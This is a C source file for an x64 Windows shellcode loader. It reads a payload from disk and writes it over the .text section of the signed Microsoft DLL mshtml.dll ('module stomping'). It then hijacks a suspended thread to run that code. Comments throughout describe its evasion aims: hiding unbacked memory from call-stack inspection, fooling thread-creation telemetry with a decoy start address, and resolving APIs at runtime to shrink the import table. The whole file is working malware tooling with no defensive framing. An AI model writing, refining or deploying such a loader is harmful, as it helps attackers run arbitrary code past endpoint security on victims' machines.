/*
 * Iteration 2 — x64 shellcode loader
 * Techniques: thread_hijacking_local + module_stomping
 * Build (MSVC x64):
 *   cl.exe /nologo /O2 /GS- loader.c
 * Run:
 *   loader.exe C:\path\to\calc.bin
 *
 * Strategy: stage the payload inside the .text of a signed Microsoft DLL
 * (mshtml.dll) so the thread's call stack resolves to an image-backed module
 * instead of an "Unbacked" private region. Thread-hijack mechanics unchanged.
 */

#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

/* ---- Function pointer typedefs for runtime-resolved APIs ---- */
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                       LPTHREAD_START_ROUTINE, LPVOID,
                                       DWORD, LPDWORD);
typedef BOOL   (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL   (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT *);
typedef DWORD  (WINAPI *pResumeThread)(HANDLE);
typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL   (WINAPI *pTerminateThread)(HANDLE, DWORD);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI *pGetModuleHandleA)(LPCSTR);

/* ---- Globals holding resolved pointers ---- */
static pVirtualAlloc            dyn_VirtualAlloc            = NULL;
static pVirtualProtect          dyn_VirtualProtect          = NULL;
static pVirtualFree             dyn_VirtualFree             = NULL;
static pLoadLibraryA            dyn_LoadLibraryA            = NULL;
static pCreateThread            dyn_CreateThread            = NULL;
static pGetThreadContext        dyn_GetThreadContext        = NULL;
static pSetThreadContext        dyn_SetThreadContext        = NULL;
static pResumeThread            dyn_ResumeThread            = NULL;
static pWaitForSingleObject     dyn_WaitForSingleObject     = NULL;
static pCloseHandle             dyn_CloseHandle             = NULL;
static pTerminateThread         dyn_TerminateThread         = NULL;

/*
 * Decoy stub — module-backed thread start routine. Lives in OUR image's
 * .text section, so CreateThread telemetry records a module-backed
 * StartAddress rather than the payload.
 */
static DWORD WINAPI DecoyStub(LPVOID lpParam)
{
    (void)lpParam;
    ExitThread(0);
    return 0; /* unreachable */
}

/* Resolve a symbol from a module handle; abort on failure. */
static FARPROC resolve(HMODULE mod, LPCSTR name, pGetProcAddress gpa)
{
    FARPROC p = gpa(mod, name);
    if (!p) {
        fprintf(stderr, "[-] GetProcAddress(%s) failed: %lu\n",
                name, GetLastError());
        ExitProcess(1);
    }
    return p;
}

/*
 * Robustly load the donor DLL. Tries the bare name first (System32 is on the
 * default search path for system DLLs), then falls back to the explicit
 * System32 path resolved at runtime via GetSystemDirectoryA — no hardcoded
 * drive letters or versioned paths.
 */
static HMODULE load_donor(pLoadLibraryA pLoadLibraryA, const char* name)
{
    HMODULE h = pLoadLibraryA(name);
    if (h) return h;

    char sysdir[MAX_PATH];
    UINT n = GetSystemDirectoryA(sysdir, MAX_PATH);
    if (n == 0 || n >= MAX_PATH) return NULL;

    char full[MAX_PATH];
    int written = _snprintf_s(full, sizeof(full), _TRUNCATE,
                              "%s\\%s", sysdir, name);
    if (written < 0) return NULL;

    return pLoadLibraryA(full);
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* ---- 0. Resolve APIs at runtime to shrink the static import table ---- */
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        fprintf(stderr, "[-] GetModuleHandleA(kernel32) failed: %lu\n",
                GetLastError());
        return 1;
    }
    pGetProcAddress gpa = (pGetProcAddress)GetProcAddress(hKernel32,
                                                          "GetProcAddress");
    if (!gpa) {
        fprintf(stderr, "[-] bootstrap GetProcAddress failed\n");
        return 1;
    }

    dyn_VirtualAlloc        = (pVirtualAlloc)       resolve(hKernel32, "VirtualAlloc",        gpa);
    dyn_VirtualProtect      = (pVirtualProtect)     resolve(hKernel32, "VirtualProtect",      gpa);
    dyn_VirtualFree         = (pVirtualFree)        resolve(hKernel32, "VirtualFree",         gpa);
    dyn_LoadLibraryA        = (pLoadLibraryA)       resolve(hKernel32, "LoadLibraryA",        gpa);
    dyn_CreateThread        = (pCreateThread)       resolve(hKernel32, "CreateThread",        gpa);
    dyn_GetThreadContext    = (pGetThreadContext)   resolve(hKernel32, "GetThreadContext",    gpa);
    dyn_SetThreadContext    = (pSetThreadContext)   resolve(hKernel32, "SetThreadContext",    gpa);
    dyn_ResumeThread        = (pResumeThread)       resolve(hKernel32, "ResumeThread",        gpa);
    dyn_WaitForSingleObject = (pWaitForSingleObject)resolve(hKernel32, "WaitForSingleObject", gpa);
    dyn_CloseHandle         = (pCloseHandle)        resolve(hKernel32, "CloseHandle",         gpa);
    dyn_TerminateThread     = (pTerminateThread)    resolve(hKernel32, "TerminateThread",     gpa);

    /* ---- 1. Read shellcode from file (no hardcoded bytes) ---- */
    FILE* fp = fopen(argv[1], "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", argv[1], errno);
        return 1;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return 1; }
    long fsz = ftell(fp);
    if (fsz <= 0) { fclose(fp); fprintf(stderr, "[-] empty file\n"); return 1; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return 1; }

    SIZE_T sc_size = (SIZE_T)fsz;
    unsigned char* sc = (unsigned char*)malloc(sc_size);
    if (!sc) { fclose(fp); return 1; }

    size_t got = fread(sc, 1, sc_size, fp);
    fclose(fp);
    if (got != sc_size) {
        fprintf(stderr, "[-] short read\n");
        free(sc);
        return 1;
    }

    /* ---- 2. Load sacrificial signed DLL (mshtml.dll) ---- */
    HMODULE hDonor = load_donor(dyn_LoadLibraryA, "mshtml.dll");
    if (!hDonor) {
        fprintf(stderr, "[-] LoadLibraryA(mshtml.dll) failed: %lu\n",
                GetLastError());
        SecureZeroMemory(sc, sc_size);
        free(sc);
        return 1;
    }

    /* ---- 3. Walk PE headers to locate the .text section ---- */
    BYTE* base = (BYTE*)hDonor;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "[-] bad DOS header\n");
        SecureZeroMemory(sc, sc_size); free(sc); return 1;
    }
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[-] bad NT header\n");
        SecureZeroMemory(sc, sc_size); free(sc); return 1;
    }

    /*
     * Prefer the section literally named ".text"; fall back to the first
     * executable code section if no ".text" is present.
     */
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    IMAGE_SECTION_HEADER* fallback = NULL;
    BYTE* text_base = NULL;
    SIZE_T text_size = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

        if (strncmp((const char*)sec->Name, ".text", 8) == 0) {
            text_base = base + sec->VirtualAddress;
            text_size = sec->Misc.VirtualSize;
            break;
        }
        if (!fallback && (sec->Characteristics & IMAGE_SCN_CNT_CODE)) {
            fallback = sec;
        }
    }
    if (!text_base && fallback) {
        text_base = base + fallback->VirtualAddress;
        text_size = fallback->Misc.VirtualSize;
    }
    if (!text_base || text_size == 0) {
        fprintf(stderr, "[-] no executable .text section found\n");
        SecureZeroMemory(sc, sc_size); free(sc); return 1;
    }
    if (sc_size > text_size) {
        fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                (size_t)sc_size, (size_t)text_size);
        SecureZeroMemory(sc, sc_size); free(sc); return 1;
    }

    /* ---- 4. Overwrite .text with payload (RW -> memcpy -> RX) ---- */
    DWORD oldProt = 0;
    if (!dyn_VirtualProtect(text_base, text_size, PAGE_READWRITE, &oldProt)) {
        fprintf(stderr, "[-] VirtualProtect(RW on .text) failed: %lu\n",
                GetLastError());
        SecureZeroMemory(sc, sc_size); free(sc); return 1;
    }
    memcpy(text_base, sc, sc_size);
    SecureZeroMemory(sc, sc_size);
    free(sc);

    DWORD tmp = 0;
    if (!dyn_VirtualProtect(text_base, text_size, PAGE_EXECUTE_READ, &tmp)) {
        fprintf(stderr, "[-] VirtualProtect(RX on .text) failed: %lu\n",
                GetLastError());
        return 1;
    }

    /* ---- 5. thread_hijacking_local ----
     * Create a suspended thread whose start routine is a benign stub inside
     * our own image. Its recorded StartAddress is module-backed. We then flip
     * RIP to the stomped module's .text and resume.
     *
     * NOTE: We intentionally do NOT modify RSP. The suspended thread's stack
     * is already correctly aligned for the x64 ABI at the thread-start
     * trampoline; masking it would corrupt the saved return chain.
     */
    HANDLE th = dyn_CreateThread(NULL, 0,
                                 (LPTHREAD_START_ROUTINE)DecoyStub,
                                 NULL,
                                 CREATE_SUSPENDED,
                                 NULL);
    if (!th) {
        fprintf(stderr, "[-] CreateThread(suspended) failed: %lu\n",
                GetLastError());
        return 1;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!dyn_GetThreadContext(th, &ctx)) {
        fprintf(stderr, "[-] GetThreadContext failed: %lu\n", GetLastError());
        dyn_TerminateThread(th, 0);
        dyn_CloseHandle(th);
        return 1;
    }

    /* Redirect instruction pointer into the stomped module's .text. */
    ctx.Rip = (DWORD64)(ULONG_PTR)text_base;

    if (!dyn_SetThreadContext(th, &ctx)) {
        fprintf(stderr, "[-] SetThreadContext failed: %lu\n", GetLastError());
        dyn_TerminateThread(th, 0);
        dyn_CloseHandle(th);
        return 1;
    }

    if (dyn_ResumeThread(th) == (DWORD)-1) {
        fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
        dyn_TerminateThread(th, 0);
        dyn_CloseHandle(th);
        return 1;
    }

    /* ---- 6. Wait for the payload thread to finish, then clean up. ---- */
    dyn_WaitForSingleObject(th, INFINITE);
    dyn_CloseHandle(th);

    return 0;
}